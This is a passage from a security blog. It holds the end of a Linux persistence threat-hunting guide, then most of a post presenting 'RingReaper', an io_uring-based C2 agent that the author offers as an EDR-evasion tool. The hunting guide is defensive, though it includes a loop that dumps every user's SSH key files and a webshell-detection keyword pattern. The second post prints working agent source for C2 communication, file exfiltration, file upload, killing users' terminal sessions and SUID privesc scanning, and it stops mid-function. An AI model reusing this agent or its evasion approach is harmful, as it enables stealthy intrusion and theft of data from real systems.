in /home/*; do [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;HOME \\\u0026#34;$(basename \u0026#34;$home_dir\u0026#34;)\\\u0026#34;\u0026#34;; [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; cat \u0026#34;$home_dir\u0026#34;/.ssh/*; done ls -la -R /home/*/.ssh */.ssh/* With this, the attacker could simply add his public key to the authorized_keys of some home or get the private key, and return to the machine at any time, and whenever he wants without needing a password.\nHunting for crontab persistence. Persistence via crontab is also a very old persistence technique, but it is still used today, basically, crontab allows us to schedule commands, scripts and programs to be executed automatically at regular intervals of time, and with that we can simply schedule a cron to execute a malicious script or some command, below are some examples.\nIn this image we see a classic example of persistence using crontab, where the 5 asterisks represent that our task will be executed every 1 minute, under the root user and then we enter the path of our script.\nPaths for search cron persistence\ncat /etc/crontab ls -la /var/spool/* ls -la -R /var/cron* Hunting for bashrc persistence .bashrc is a script file used in Linux Bash to configure environment variables, aliases, and other terminal customizations. Thinking like an attacker, you could make a malicious alias so that when the victim runs a command, for example the ls command, it sends you a reverse shell, executes a script, among many others.\nYou can search using this command:\ncat /home/*/{.bashrc,.zshrc} ls -la /home/*/{.bashrc,.zshrc} Hunting APT command persistence In short, apt is a program package management system that has automatic resolution of dependencies between packages, easy package installation method, ease of operation, allows you to easily update your distribution, etc.\nBut until then there is nothing \u0026ldquo;malicious\u0026rdquo;, however, apt has a command called apt update, which is for updating packages, and it also has a directory in: /etc/apt/apt.conf.d.\nThe /etc/apt/apt.conf.d directory is used to manage apt specific configurations on the operating system.\nBut what if we can create a malicious configuration to be able to send a reverse shell to us every time someone uses the apt update command, yes, this is totally possible, below are some examples.\nYou can use this command to find and check them one by one.\nls -la -R /etc/apt/apt.conf.d Hunting for Privileged user \u0026amp; SUID bash In a real attack scenario, depending on the attacker can also put SUID permissions on binaries, for example bash to be able to use it with root permission, and also add a user so that he can use sudo su and be root without having to password by changing the file /etc/sudoers.\nScenario 1 Scenario 2 You can check using these commands below:\nfind / -perm /4000 2\u0026gt;/dev/null #for search suid binaries/files ls -la $(whereis bash) ls -la /etc/sudoers.d cat /etc/sudoers cat /etc/groups #Here you can also check if a user is in the wrong group Hunting for malicious systemd service Systemd is a startup and service management system it simplifies system startup and service management.\nA malicious attacker abuses systemd to create a malicious service, for example, to send a reverse shell every 1 minute.\nPersistence by a service in systemd, it is widely used, it is always good to see what services you have on your machine, a tip for this type of situation is to use pspy64 which is basically a real-time process monitor, and when a service in systemd for example is executed, it appears in pspy too, and the same goes for crontab.\nHere are some directories you can check:\nls -la /etc/systemd/system ls -la /lib/systemd/system ls -la /run/systemd/system ls -la /usr/lib/systemd/system ls -la /home/*/.config/systemd/user/ To stop the malicious service, simply run the commands:\nsystemctl stop malicious.service systemctl disable malicious.service rm malicious.service Hunting for Loadable kernel module Rootkits LKM (Loadable kernel module) rootkits are certainly an absurd challenge to hunt, as it simply hides, becomes invisible, and once it is invisible it is almost impossible to remove it, in technical details, rootkits use a function called list_del which basically removes from lsmod (list modules) that is capable of listing the machine\u0026rsquo;s kernel modules, the big problem with this is that rmmod (remove module) is not capable of removing a module that is not in lsmod, so rootkits are very efficient at remaining persistent without anyone being able to detect why this is one of the main objectives of a rootkit, to remain persistent and invisible, but in this part of the post, I will teach you some techniques that can help you find rootkits and detect them, however, as stated above, removing them is a difficult task and depends on the type of rootkit, if it is one you can find on github like for example diamorphine, it has the function of becoming visible again, and then you can remove it.\nAs you can see here, it is invisible and even if it is still in the system, you will not be able to remove it.\nBut diamorphine was also designed to be visible, by default which is by using kill -63 0 and then you can remove it.\nHunting without tools I will use the diamorphine rootkit as an example to do hunting.\nThe most basic thing to do when a rootkit is not in lsmod is to check the kernel log files, such as:\ndmesg /var/log/kern.log /var/log/dmesg* It is very important to view the kernel logs because when an LKM is entered, it generates logs there as well.\nWe can also view: /sys/kernel/tracing/available_filter_functions which is basically a feature in Linux that lists the functions available to filter events during kernel tracing.\nWe can also view all available functions with their respective addresses /sys/kernel/tracing/available_filter_functions_addrs\nIt is also very important that we check the files and commands:\n/proc/modules /proc/kallsyms /lib/modules /proc/* lsmod #to view modules ps aufwx #to view all process in machine ss -tunlpd #to view connections lsof -i -P -n #to view process in execution and file open /proc/*/maps /proc/*/cwd /proc/*/environ Hunting with tools Unhide I\u0026rsquo;ll start using unhide which is a forensic tool to find processes and TCP/UDP ports hidden by rootkits, Linux kernel modules or by other techniques.\nAs we can see in the image above, we hid a PID, and using unhide, we were able to find it.\nRkhunter (rootkit hunter) Rkhunter is a good tool, however it is based on known signatures/strings, that is, if you modify the functions you can easily bypass its detection, you can see this video using the D3m0n1z3dShell tool for this.\nHowever, for known rootkits and if they are inserted by default without any modification, rkhunter can easily detect them, in the case of diamorphine and other rootkits, if it is invisible to lsmod, depending on it it cannot detect it, which is the case with diamorphine, if I make the module visible, it detects it, otherwise it goes unnoticed.\nNow with the rootkit hidden again:\nHere is the log that rkhunter generates, and basically for it to detect if it really is the diamorphine rootkit, it uses signature/strings which is clearly very easy to bypass detection.\nThis is enough to avoid detection.\nAgain, rkhunter is good for rootkits that have not been modified and signature/strings already exist, but still, don\u0026rsquo;t trust it 100%.\nchkrootkit Chkrootkit is a rootkit detection tool on Unix-like systems. It scans the system for signs of malicious activity such as suspicious files, hidden processes, and modifications to system libraries.\nChkrootkit is good at detecting hidden processes and directory as well, but as mentioned on rkhunter, don\u0026rsquo;t trust chkrootkit 100% as it is still possible to avoid detection of an LKM rootkit.\nTracee EBPF Tracee is a runtime security and observability tool that helps you understand how your system and applications behave. Tracee uses eBPF, and it is a great forensics tool, in my opinion it is the best there is for detecting rootkits as well, as it also detects if a syscall has been hooked.\nOBS: To disable LKM insertion you can use sysctl for this:\nsudo sysctl -w kernel.modules_disabled=1 To return it to default, simply change the 1 to 0.\nHere are some talks and posts about tracee detecting LKM rootkits, it\u0026rsquo;s really worth watching!\nDetecting Linux Syscall Hooking Using Tracee\nBlackHat Arsenal 2022: Detecting Linux kernel rootkits with Aqua Tracee\neBPF Warfare - Detecting Kernel \u0026amp; eBPF Rootkits with Tracee\nHunting kernel rootkits with eBPF by Asaf Eitani \u0026amp; Itamar Maouda Kochavi\nBônus tools:\nLynis is a security auditing tool Tiger is a security audit tool #sudo apt install tiger -y Volatily #advanced memory forensics Hunting LD_PRELOAD Rootkits LD_PRELOAD rootkits are easier to hunt down and remove from the machine, because basically besides being Userland, most of them involve the use of shared object (*.so)\nIn this part, I will use a userland rootkit created by h0mbre\nSome LD_PRELOAD rootkits hide from /etc/ld.so.preload but it is possible to find it anyway.\nTo be able to confirm, it is always a good idea to check the binaries with ldd to see which shared objects it has.\nTo remove it, it\u0026rsquo;s very simple.\nAnd that\u0026rsquo;s it, it has already been removed from the machine.\nAs said, userland rootkits are much easier to detect and remove, below are some directories/files that are good to check.\n/lib/x86_64-linux-gnu /lib/* /usr/lib/x86_64-linux-gnu /usr/lib/* ls -la /etc/ld* cat /etc/ld.so.preload ldd /bin/ls ldd /bin/bash ldd /usr/bin/ssh ldd /usr/bin/netstat ldd /bin/* #check for shared object in binary, which you suspect ldd /usr/bin/* #check for shared object in binary, which you suspect /proc/*/maps Using volatily also helps a lot in this analysis process.\nHunting for PAM Backdoor PAM Backdoor is a well-known persistence technique, it works by manipulating the Pluggable Authentication Modules (PAM) authentication system. This allows unauthorized access to the system by granting a specific user privileged access regardless of correct credentials.\nI will use this repository that automates this persistence process.\nNow that the PAM Backdoor has been inserted, let\u0026rsquo;s search for it.\nOne thing we can do to detect something \u0026ldquo;abnormal\u0026rdquo; in it is to use strings, I downloaded a Normal Linux PAM on my machine and compiled it.\nMalicious pam_unix.so Here we\u0026rsquo;ll see in the strings that the password we used is there, called \u0026ldquo;hunt3r\u0026rdquo; on line 376, so we can do the same thing, look on lines 375 to 378 or so and see if there\u0026rsquo;s anything there.\nNormal pam_unix.so And now in the uninfected pam_unix.so, there is nothing interesting in these lines, so in an infected pam_unix.so, if you use the strings and analyze it, you will see the password that is used for unauthorized access\ncat /usr/include/type.h find / -name \u0026#34;pam_unix.so\u0026#34; 2\u0026gt;/dev/null ls -la /lib/security ls -la /usr/lib/security ls -la /lib/x86_64-linux-gnu/security ls -la /etc/pam.d/* Here are two repository links on github that automate persistence, you can read the code and understand it, maybe look for other ways to hunt.\nmadlib\nLinux PAM Backdoor\nHunting for ACL Persistence Just like in Active Directory/Windows, in Linux there is also an ACL, and this can be used to maintain persistence as well.\nIn a scenario where an attacker has compromised one of your Linux machines and knows that at any time he may lose access to the machine or a specific directory/file, he can abuse the ACL (access control list) by using the setfacl command to change Control access to a file or directory for any user you want, with whatever permissions you want.\nNow the user kali can access /root even without being root, because we changed the ACL of the /root directory for the user kali be able to have read, write and execute permissions.\nTo be able to do a hunt, it\u0026rsquo;s very simple, just use the command getfacl which basically displays the access control lists (ACLs) associated with files and directories and then use setfacl -b DIR/FILE for remove ACL.\nWe can also create a simple bash script to run and whatever it finds in ACL it will print on the screen.\n#!/bin/bash users=$(awk -F\u0026#39;:\u0026#39; \u0026#39;$1!=\u0026#34;root\u0026#34; {print $1}\u0026#39; /etc/passwd) check_acl_for_user() { local user=\u0026#34;$1\u0026#34; echo \u0026#34;Checking ACLs for user: $user\u0026#34; acl_output=$(getfacl -R /* | grep \u0026#34;^# file: \\|user:$user$\u0026#34;) if [[ -n \u0026#34;$acl_output\u0026#34; ]]; then echo \u0026#34;$acl_output\u0026#34; fi } for user in $users; do check_acl_for_user \u0026#34;$user\u0026#34; done Hunting init.d persistence init.d are the scripts that are executed at machine startup, that is, as soon as the machine is turned on, the scripts that are on it are executed, and this is like gold for an attacker, as he can simply add a reverse shell payload, or execute any script he wants, as soon as the machine starts/restarts.\nNow after reboot:\nTo remove it is quite simple.\nFor hunting just check these two directories:\nls -la /etc/init.d/* ls -la /etc/rc*.d/ Hunting MOTD Persistence MOTD (Message of the Day) is a message displayed to users when they log into a system, usually through SSH or the console. It is a way of providing important information, such as maintenance notices, usage policies, system news or any other relevant information to users.\nThis persistence technique basically consists of creating a malicious MOTD that when someone join into the machine using ssh for example, our Malicious MOTD will be executed, below is an example of how it works.\nBasically what we did was go to /etc/update-motd.d and create a new MOTD containing the path of a reverse shell script, so that as soon as someone sshs in, the reverse shell will be executed and Regardless of which user you enter, the shell will always be root, as ssh runs as root.\nTo be able to hunt you can check these directories looking for an Abnormal MOTD.\nls -la /etc/update-motd.d/* /usr/lib/update-notifier/update-motd-updates-available cat /etc/motd find / -name \u0026#34;*motd*\u0026#34; 2\u0026gt;/dev/null Hunting for hidden process mounted This technique of using mount to mount a process in another directory is quite old, but it\u0026rsquo;s worth knowing how it works and knowing how to undo it.\nTo be able to hunt, it\u0026rsquo;s very simple, just use the mount command to see what is mounted.\nmount mount|grep proc umount /proc/PID umount -l /proc/PID Hunting for webshells Of course, using webshells for persistence is an old technique. When an attacker gains access to a machine, even without elevated privileges, they can deploy a webshell. A webshell allows the attacker to access the machine, even without direct access to the server via browser/web and from there, the attacker can execute commands and even execute a reverse shell to gain access to the server without depending on the webshell.\nHere we have an example of a simple webshell in PHP.\nWe can detect it using this oneline and with tools too.\ngrep -rlE \u0026#39;fsockopen|pfsockopen|exec|shell|system|eval|rot13|base64|base32|passthru|\\$_GET|\\$_POST\\$_REQUEST|cmd|socket\u0026#39; /var/www/html/*.php | xargs -I {} echo \u0026#34;Suspicious file: {}\u0026#34; We can also look at the apache logs, it also shows what the file was.\nWe can also use tools like BackDoorMan, NeoPI, Shell-Detector and WebShell-AIHunter that help in detecting malicious webshells.\nHunting rc.local persistence rc.local is a startup script in Linux used to execute custom commands or scripts during the system boot process, however it has been replaced by more modern methods such as systemd service units.\nAn attacker could add a reverse shell to /etc/rc.local and every time your machine is started, the content on it will be executed with root privileges, thus providing very good and effective persistence.\nAfter the reboot, the content inside rc.local which was the reverse shell was executed successfully and we can see its process.\nWe can also see when it was run using systemctl status rc-local.\nTo be able to hunt, just check these files and directories:\n/etc/rc.local /lib/systemd/system/rc-local.service.d cat /run/systemd/generator/multi-user.target.wants/rc-local.service systemctl status rc-local So this was the post, I hope you liked it, if you have any questions or if you didn\u0026rsquo;t understand any part, DM me on Twitter: @MatheuzSecurity\nSo that\u0026rsquo;s it, until next time!\n","permalink":"http://localhost:1313/hacking/linux-threat-hunting-persistence/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/lM0kWBM.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\u003c/p\u003e\n\u003cp\u003eThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\u003c/p\u003e\n\u003cp\u003eBelow is what we will cover in this post.\u003c/p\u003e","title":"Linux Threat Hunting Persistence"},{"content":"Full source: https://github.com/MatheuZSecurity/RingReaper\nTable of Contents Introduction What is io_uring? The Agent Code Analysis How Does the EDR Typically Fail Here? Practical EDR Bypass Python C2 Server Flow Defensive Reflections Conclusion Introduction Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as EDR (Endpoint Detection and Response) evolve rapidly, making the work of an attacker more challenging.\nWe, as red teamers, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\nIn this article, I will explore the use of io_uring, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.\nWhat is io_uring? io_uring was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using submission and completion rings. In other words:\nThe process places I/O requests into a queue shared with the kernel The kernel executes them when it can, without blocking the user thread The result comes back through another completion ring The critical point is that this model allows for multiple operations (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling read, write, send, connect, everything happens through io_uring_submit() and mapped buffers.\nThe Agent This agent essentially acts as a \u0026ldquo;backdoor\u0026rdquo;, though it\u0026rsquo;s not persistent yet, at the time of writing, persistence modules haven\u0026rsquo;t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:\nNetwork communication using io_uring_prep_send and io_uring_prep_recv File reading via io_uring_prep_openat and io_uring_prep_read File upload without explicit write or read syscalls Post-exploitation command execution (listing users, processes, connections, etc.) Self-deletion (self-destruct) that removes its own binary using io_uring_prep_unlinkat On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.\nCode analysis of the agent send_all\nint send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) { size_t sent = 0; while (sent \u0026lt; len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0); io_uring_submit(ring); struct io_uring_cqe *cqe; io_uring_wait_cqe(ring, \u0026amp;cqe); int ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) return ret; sent += ret; } return sent; } This function ensures that a complete buffer is sent by a socket using asynchronous io_uring calls, in a way that is robust against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.\nUpon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.\nThe goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.\nrecv_all:\nssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_recv(sqe, sockfd, buf, len, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); return ret; } This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.\nIt obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.\nIt then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.\nread_file_uring:\nThis function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.\nEach block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.\ncmd_users:\nvoid cmd_users(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/var/run/utmp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /var/run/utmp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } int count = ret / sizeof(struct utmp); struct utmp *entries = (struct utmp*)buf; char out[8192]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Logged users:\\n\u0026#34;); for (int i = 0; i \u0026lt; count; i++) { if (entries[i].ut_type == USER_PROCESS) { out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-8s %-8s\\n\u0026#34;, entries[i].ut_user, entries[i].ut_line); if (out_pos \u0026gt; sizeof(out) - 100) break; } } send_all(ring, sockfd, out, out_pos); } This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file (where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.\ncmd_ss:\nvoid cmd_ss(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/proc/net/tcp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /proc/net/tcp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } char out[16384]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Local Address Remote Address State UID\\n\u0026#34;); char *line = strtok(buf, \u0026#34;\\n\u0026#34;); line = strtok(NULL, \u0026#34;\\n\u0026#34;); while (line) { unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid; sscanf(line, \u0026#34;%u: %8X:%X %8X:%X %X %*s %*s %*s %u\u0026#34;, \u0026amp;sl, \u0026amp;local_ip, \u0026amp;local_port, \u0026amp;rem_ip, \u0026amp;rem_port, \u0026amp;st, \u0026amp;uid); char local_str[32], rem_str[32]; snprintf(local_str, sizeof(local_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (local_ip \u0026amp; 0xFF), (local_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, local_port); snprintf(rem_str, sizeof(rem_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (rem_ip \u0026amp; 0xFF), (rem_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, rem_port); out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-22s %-22s %-5X %u\\n\u0026#34;, local_str, rem_str, st, uid); if (out_pos \u0026gt; sizeof(out) - 100) break; line = strtok(NULL, \u0026#34;\\n\u0026#34;); } send_all(ring, sockfd, out, out_pos); } The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.\ncmd_get;\nvoid cmd_get(struct io_uring *ring, int sockfd, const char *path) { struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[256]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } char buf[BUF_SIZE]; ssize_t ret; off_t offset = 0; while (1) { sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) break; offset += ret; if (send_all(ring, sockfd, buf, ret) \u0026lt;= 0) { break; } } close(fd); } cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.\ncmd_recv:\nvoid cmd_recv(struct io_uring *ring, int sockfd, const char *args) { char remote_path[256]; long expected_size = 0; char buf[BUF_SIZE]; if (sscanf(args, \u0026#34;%255s %ld\u0026#34;, remote_path, \u0026amp;expected_size) != 2 || expected_size \u0026lt;= 0) { const char *msg = \u0026#34;Usage: recv \u0026lt;remote_path\u0026gt; \u0026lt;size\u0026gt;\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); return; } struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); int fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, remote_path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } off_t offset = 0; while (offset \u0026lt; expected_size) { size_t to_read = (expected_size - offset \u0026gt; BUF_SIZE) ? BUF_SIZE : (expected_size - offset); sqe = io_uring_get_sqe(ring); io_uring_prep_recv(sqe, sockfd, buf, to_read, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t received = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (received \u0026lt;= 0) { break; } sqe = io_uring_get_sqe(ring); io_uring_prep_write(sqe, fd, buf, received, offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); io_uring_cqe_seen(ring, cqe); offset += received; } close(fd); } cmd_me:\nvoid cmd_me(struct io_uring *ring, int sockfd) { char buf[128]; pid_t pid = getpid(); char *tty = ttyname(STDIN_FILENO); if (!tty) tty = \u0026#34;(none)\u0026#34;; snprintf(buf, sizeof(buf), \u0026#34;PID: %d\\nTTY: %s\\n\u0026#34;, pid, tty); send_all(ring, sockfd, buf, strlen(buf)); } This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.\ncmd_ps:\nvoid cmd_ps(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/proc\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /proc\\n\u0026#34;, 21); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;PID CMD\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { if (entry-\u0026gt;d_type != DT_DIR) continue; char *endptr; long pid = strtol(entry-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char comm_path[64]; snprintf(comm_path, sizeof(comm_path), \u0026#34;/proc/%ld/comm\u0026#34;, pid); char name[256]; int ret = read_file_uring(ring, comm_path, name, sizeof(name)); if (ret \u0026gt; 0) { name[strcspn(name, \u0026#34;\\n\u0026#34;)] = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%-7ld %s\\n\u0026#34;, pid, name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(dir); send_all(ring, sockfd, out, pos); } The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.\ncmd_kick:\nvoid cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) { char out[4096]; if (!arg_raw) arg_raw = \u0026#34;\u0026#34;; char *arg = (char *)arg_raw; trim_leading(\u0026amp;arg); if (strlen(arg) == 0) { DIR *d = opendir(\u0026#34;/dev/pts\u0026#34;); if (!d) { snprintf(out, sizeof(out), \u0026#34;Failed to open /dev/pts: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } struct dirent *entry; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Active pts sessions:\\n\u0026#34;); while ((entry = readdir(d)) != NULL) { if (entry-\u0026gt;d_name[0] \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; entry-\u0026gt;d_name[0] \u0026lt;= \u0026#39;9\u0026#39;) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;pts/%s\\n\u0026#34;, entry-\u0026gt;d_name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(d); send_all(ring, sockfd, out, pos); return; } char target_tty[64]; snprintf(target_tty, sizeof(target_tty), \u0026#34;/dev/pts/%s\u0026#34;, arg); DIR *proc = opendir(\u0026#34;/proc\u0026#34;); if (!proc) { snprintf(out, sizeof(out), \u0026#34;Failed to open /proc: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } int found_pid = 0; struct dirent *dent; while ((dent = readdir(proc)) != NULL) { char *endptr; long pid = strtol(dent-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char fd_path[256]; snprintf(fd_path, sizeof(fd_path), \u0026#34;/proc/%ld/fd\u0026#34;, pid); DIR *fd_dir = opendir(fd_path); if (!fd_dir) continue; struct dirent *fd_ent; while ((fd_ent = readdir(fd_dir)) != NULL) { if (fd_ent-\u0026gt;d_name[0] == \u0026#39;.\u0026#39;) continue; char link_path[512]; char link_target[512]; ssize_t link_len; snprintf(link_path, sizeof(link_path), \u0026#34;%s/%s\u0026#34;, fd_path, fd_ent-\u0026gt;d_name); link_len = readlink(link_path, link_target, sizeof(link_target) -1); if (link_len \u0026lt; 0) continue; link_target[link_len] = 0; if (strcmp(link_target, target_tty) == 0) { found_pid = (int)pid; break; } } closedir(fd_dir); if (found_pid) break; } closedir(proc); if (!found_pid) { snprintf(out, sizeof(out), \u0026#34;No process found using %s\\n\u0026#34;, target_tty); send_all(ring, sockfd, out, strlen(out)); return; } if (kill(found_pid, SIGKILL) == 0) { snprintf(out, sizeof(out), \u0026#34;Killed process %d using %s\\n\u0026#34;, found_pid, target_tty); } else { snprintf(out, sizeof(out), \u0026#34;Failed to kill process %d: %s\\n\u0026#34;, found_pid, strerror(errno)); } send_all(ring, sockfd, out, strlen(out)); } This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.\ncmd_privesc:\nvoid cmd_privesc(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/usr/bin\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /usr/bin\\n\u0026#34;, 23); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Potential SUID binaries:\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { char path[512]; snprintf(path, sizeof(path), \u0026#34;/usr/bin/%s\u0026#34;, entry-\u0026gt;d_name); struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; struct statx stx; io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, \u0026amp;stx); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res == 0 \u0026amp;\u0026amp; (stx.stx_mode \u0026amp; S_ISUID)) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%s\\n\u0026#34;, path); if (pos \u0026gt; sizeof(out) - 100) break; } io_uring_cqe_seen(ring, cqe); } closedir(dir); send_all(ring, sockfd, out, pos); } This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.\ncmd_selfdestruct:\nvoid cmd_selfdestruct(struct io_uring 